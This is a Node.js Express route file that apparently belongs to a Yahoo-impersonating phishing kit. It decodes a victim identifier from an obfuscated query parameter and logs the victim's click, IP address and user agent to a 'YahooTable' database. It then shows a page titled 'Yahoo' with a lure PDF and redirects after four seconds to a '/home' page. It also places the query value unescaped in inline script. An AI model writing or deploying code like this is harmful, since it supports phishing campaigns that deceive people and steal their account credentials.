
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.bvnvbmvmcsdfkasdjfkasfsbtyrhyrhrkfbsdfshdfhsdfh;
   
    if (data == null) {
        res.render('error');
        
          }else{
  
    const userid = Buffer.from(data, 'base64').toString('utf-8');
        
    const word = 'clicked';
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim();
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 2;

const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
  db.query(sqlQuery, [userid], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

  if (rowCount > 0) {

                const updateQuery = 'UPDATE YahooTable SET password = ?, pagetype = ?, mobiletype = ?, notify = ? WHERE username = ?';
                db.query(updateQuery, [word, pagetype, mobiletype, notify, userid], (err) => {
                    if (err) {
                        console.error('Error inserting record:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                

                    });


        }else{

            const insertQuery = 'INSERT INTO YahooTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        }

   
    const url = `/home/?kjgfhdgudgherueru9843efjdfhfwheur=${data}`;

   

    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 4000);
            </script> 
            <!-- Required meta tags -->
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
            <meta name="format-detection" content="telephone=no">
            <title>Yahoo</title>
            
        </head>
        <body>

        <object data="./DNO LTR NO-2468 DT 24 Nov 2024.pdf" style="height:1200px;width:2060px;" ></object>
        
    </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            
});
}
});

module.exports =router
